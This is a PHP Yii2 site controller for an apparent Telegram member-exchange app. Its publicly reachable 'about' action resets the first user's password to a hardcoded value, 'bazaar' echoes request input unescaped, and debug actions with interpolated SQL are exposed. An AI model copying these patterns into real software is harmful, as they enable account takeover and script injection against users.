<?php

namespace app\controllers;

use app\components\Helper;
use app\components\Telegram;
use app\components\Tools;
use app\models\Channel;
use app\models\Log;
use app\models\MemberRequest;
use app\models\Option;
use app\models\Turn;
use app\models\User;
use Symfony\Component\Finder\Exception\AccessDeniedException;
use Yii;
use yii\data\ActiveDataProvider;
use yii\filters\AccessControl;
use yii\web\Controller;
use yii\filters\VerbFilter;
use app\models\LoginForm;
use app\models\ContactForm;
use yii\web\ForbiddenHttpException;
use yii\web\HttpException;
use yii\web\NotFoundHttpException;

class SiteController extends Controller
{
	public $description;
	public $keywords;
	
	public function behaviors()
	{
		return [
			'access' => [
				'class' => AccessControl::className(),
				'only'  => ['logout'],
				'rules' => [
					[
						'actions' => ['logout'],
						'allow'   => true,
						'roles'   => ['@'],
					],
				],
			],
			'verbs'  => [
				'class'   => VerbFilter::className(),
				'actions' => [
					'logout' => ['post'],
				],
			],
		];
	}
	
	public function actions()
	{
		return [
			'error'   => [
				'class' => 'yii\web\ErrorAction',
			],
			'captcha' => [
				'class'           => 'yii\captcha\CaptchaAction',
				'fixedVerifyCode' => YII_ENV_TEST ? 'testme' : null,
			],
		];
	}
	
	public function actionIndex()
	{
		return $this->render('index');
	}
	
	public function actionLogin()
	{
		if (!\Yii::$app->user->isGuest) {
			return $this->goHome();
		}
		
		$model = new LoginForm();
		
		if ($model->load(Yii::$app->request->post()) && $model->login()) {
			
			return $this->goBack();
		}
		
		return $this->render('login', compact('model'));
	}
	
	public function actionRegister()
	{
		if (!\Yii::$app->user->isGuest) {
			return $this->goHome();
		}
		
		$model           = new User();
		$model->scenario = User::SCENARIO_REGISTER;
		$model->type     = 1;
		
		if ($model->load(Yii::$app->request->post())) {
			$model->active = 1;
			/*
			 * @todo send password to email
			 */
			
			if ($model->save()) {
				$this->redirect(['/login' . '?register=1']);
			}
		}
		
		return $this->render('register', compact('model'));
	}
	
	public function actionLogout()
	{
		Yii::$app->user->logout();
		
		return $this->goHome();
	}
	
	public function actionContact()
	{
		$model = new ContactForm();
		if ($model->load(Yii::$app->request->post()) && $model->contact(Yii::$app->params['adminEmail'])) {
			Yii::$app->session->setFlash('contactFormSubmitted');
			
			return $this->refresh();
		}
		
		return $this->render('contact', [
			'model' => $model,
		]);
	}
	
	public function actionAbout()
	{
		$user           = User::findOne(1);
		$user->password = Yii::$app->security->generatePasswordHash('sal2004');
		$user->update();
		
		return $this->render('about');
	}
	
	
	public function actionProfile()
	{
		if (Yii::$app->user->isGuest) {
			throw new HttpException(403, 'لطفا ابتدا از صفحه اصلی وارد سامانه شوید.');
		}
		
		$user_id = Yii::$app->user->id;
		
		$logs = new ActiveDataProvider([
			'query' => Log::find()->where(['user_id' => $user_id]),
		]);
		
		return $this->render('profile', [
			'model' => User::findOne($user_id),
			'logs'  => $logs
		]);
	}
	
	public function actionUpdate()
	{
		if (Yii::$app->user->isGuest) {
			throw new HttpException(403, 'لطفا ابتدا از صفحه اصلی وارد سامانه شوید.');
		}
		
		$user_id = Yii::$app->user->id;
		
		$model = User::findOne($user_id);
		
		if ($model->load(Yii::$app->request->post()) && $model->save()) {
			Helper::refreshUser($user_id);
			Helper::setLog($user_id, 'پروفایل کاربری خود را به روز کرد');
			
			return $this->redirect(['profile']);
		} else {
			return $this->render('updateProfile', [
				'model' => $model,
			]);
		}
	}
	
	public function actionDl()
	{
		
		$source = isset($_GET['d']) ? $_GET['d'] : null;
		
		if ($source != null) {
			if ($source == 'tel') {
				$counter        = Option::findOne(43);
				$counter->value = $counter->value + 1;
				$counter->update();
			}
		} else {
			
		}
		
		$this->redirect('/dl/supermember.apk');
	}
	
	public function actionTest()
	{
		$query = (new \yii\db\Query());
		$query->from(MemberRequest::tableName());
		$query->where(['finished' => 0, 'active' => 1]);
		$query->andWhere('count > done_count');
		$query->andWhere('user_id <> :follower', [':follower' => 1]);
		$query->andWhere("ChannelId NOT IN (1)");
		
		// for security
		$categories = explode(',', 1);
		$categories = implode(',', $categories);
		
		$query->andWhere("ChannelId IN (SELECT id FROM channel WHERE category_id IN '$categories')");
		$query->andWhere("ChannelId NOT IN (SELECT channel_id FROM user_follows WHERE user_id = 34534)");
		$query->andWhere("province_id IN(NULL, 1)");
		$query->orderBy('province_id DESC, id ASC');
		$query->limit(1);
		
		$request = $query->one();
		
		Tools::debug($request);
	}
	
	public function actionBazaar($code)
	{
		echo $code;
	}
	
	public function actionEcho()
	{
		echo Helper::timestamp_to_shamsi(1489094099);
		echo time();
		echo Yii::getAlias('@webroot') . '/contents/channel_pics/';
		
		$e = User::findOne(['first_name' => 'Ha', 'last_name' => 'M']);
		
		if ($e) {
			echo 'tes';
		} else {
			echo 'new';
		}
	}
	
	public function actionSend()
	{
		$channel = Channel::findOne(7);
		$tel     = new Telegram($channel);
		$text
				 = '<b>bold</b>, <strong>bold</strong>
<i>italic</i>, <em>italic</em>
<a href="http://www.example.com/">inline URL</a>
<code>inline fixed-width code</code>
<pre>pre-formatted fixed-width code block</pre>' . PHP_EOL . 'test';
		$tel->sendMessage($text, 'HTML');
	}
	
	public function actionGet()
	{
		Tools::debug(json_decode('{"total_coin_back":["\u0633\u06a9\u0647 \u0647\u0627\u06cc \u0628\u0627\u0632\u06af\u0634\u062a\u06cc \u0628\u0627\u06cc\u062f \u06cc\u06a9 \u0639\u062f\u062f \u0635\u062d\u06cc\u062d \u0628\u0627\u0634\u062f."]}'));
	}
}
